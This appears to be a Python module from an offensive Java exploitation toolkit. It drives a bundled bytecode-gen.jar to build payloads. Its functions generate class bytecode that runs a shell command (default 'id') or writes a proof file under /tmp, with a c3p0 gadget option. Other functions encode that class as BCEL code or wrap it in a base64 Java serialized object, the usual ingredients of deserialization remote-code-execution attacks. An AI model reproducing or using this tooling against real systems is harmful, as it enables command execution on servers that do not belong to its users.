"""调用内置 bytecode-gen.jar。"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any, Optional

_JAR_NAME = "bytecode-gen.jar"


def _package_jar_path() -> Path:
    return Path(__file__).resolve().parent / "jars" / _JAR_NAME


def _vendor_jar_path() -> Path:
    return (
        Path(__file__).resolve().parents[4]
        / "vendor"
        / "bytecode-gen"
        / "target"
        / _JAR_NAME
    )


def resolve_jar_path(explicit: Optional[str] = None) -> Path:
    if explicit:
        p = Path(explicit).expanduser().resolve()
        if p.is_file():
            return p
        raise FileNotFoundError(f"bytecode jar 不存在: {p}")
    env = (os.environ.get("FJ_BYTECODE_JAR") or "").strip()
    if env:
        p = Path(env).expanduser().resolve()
        if p.is_file():
            return p
        raise FileNotFoundError(f"FJ_BYTECODE_JAR 指向的文件不存在: {p}")
    pkg = _package_jar_path()
    if pkg.is_file():
        return pkg
    vendor = _vendor_jar_path()
    if vendor.is_file():
        return vendor
    raise FileNotFoundError(
        "未找到 bytecode-gen.jar。请先构建：\n"
        "  cd vendor/bytecode-gen && .\\build.ps1\n"
        "或设置环境变量 FJ_BYTECODE_JAR。"
    )


def _which_java() -> str:
    path = shutil.which("java")
    if not path:
        raise RuntimeError("未找到 java，请安装 JDK 并加入 PATH")
    return path


def _run_jar(action: str, stdin_text: Optional[str] = None, *, timeout: float = 60.0) -> dict[str, Any]:
    jar = resolve_jar_path()
    java = _which_java()
    cmd = [java, "-jar", str(jar), action]
    try:
        proc = subprocess.run(
            cmd,
            input=stdin_text.encode("utf-8") if stdin_text is not None else None,
            capture_output=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as e:
        raise RuntimeError(f"bytecode-gen.jar 超时 ({timeout}s)") from e
    raw = (proc.stdout or b"").decode("utf-8", errors="replace").strip()
    err = (proc.stderr or b"").decode("utf-8", errors="replace").strip()
    if not raw:
        raise RuntimeError(
            f"bytecode-gen.jar 无输出 (exit={proc.returncode})"
            + (f"\nstderr:\n{err}" if err else "")
        )
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"bytecode-gen.jar 返回非 JSON: {raw[:300]!r}") from e
    if isinstance(parsed, dict) and parsed.get("error"):
        raise RuntimeError(f"bytecode-gen error: {parsed['error']}")
    if proc.returncode != 0:
        raise RuntimeError(
            f"bytecode-gen.jar exit={proc.returncode}: {parsed!r}"
            + (f"\nstderr:\n{err}" if err else "")
        )
    if not isinstance(parsed, dict):
        raise RuntimeError(f"bytecode-gen.jar 响应类型异常: {type(parsed)}")
    return parsed


def generate_touch_exec(
    *,
    mode: str = "exec",
    cmd: str = "id",
    proof_path: str = "/tmp/fj_preset",
    proof_content: str = "FJ_PRESET",
    class_name: Optional[str] = None,
    for_c3p0: bool = False,
    timeout: float = 60.0,
) -> dict[str, Any]:
    body: dict[str, Any] = {
        "mode": mode,
        "cmd": cmd,
        "proofPath": proof_path,
        "proofContent": proof_content,
        "forC3p0": for_c3p0,
    }
    if class_name:
        body["className"] = class_name
    parsed = _run_jar("generate", json.dumps(body, separators=(",", ":")), timeout=timeout)
    result = parsed.get("bytecodeResult")
    if not isinstance(result, dict) or not result.get("classBytesBase64"):
        raise RuntimeError(f"bytecode-gen 响应缺少 classBytesBase64: {str(parsed)[:300]!r}")
    return result


def encode_bcel_via_jar(class_b64: str, *, timeout: float = 30.0) -> str:
    parsed = _run_jar(
        "encode",
        json.dumps({"classBytesBase64": class_b64}, separators=(",", ":")),
        timeout=timeout,
    )
    code = parsed.get("bcelCode")
    if not isinstance(code, str) or not code:
        raise RuntimeError(f"bytecode-gen encode 失败: {parsed!r}")
    return code


def serialize_via_jar(
    class_b64: str,
    *,
    class_name: str = "PresetSer",
    timeout: float = 60.0,
) -> str:
    parsed = _run_jar(
        "serialize",
        json.dumps(
            {"classBytesBase64": class_b64, "className": class_name},
            separators=(",", ":"),
        ),
        timeout=timeout,
    )
    ser = parsed.get("serializedBase64")
    if not isinstance(ser, str) or not ser:
        raise RuntimeError(f"bytecode-gen serialize 失败: {parsed!r}")
    return ser
